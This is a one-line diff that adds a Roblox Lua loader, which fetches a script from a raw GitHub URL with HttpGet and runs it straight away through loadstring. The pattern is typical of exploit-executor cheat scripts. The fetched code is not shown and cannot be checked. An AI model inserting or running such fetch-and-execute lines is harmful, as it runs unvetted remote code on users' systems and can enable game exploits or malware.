@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Sidhsksjsjsh/click-to-build/main/.lua"))()
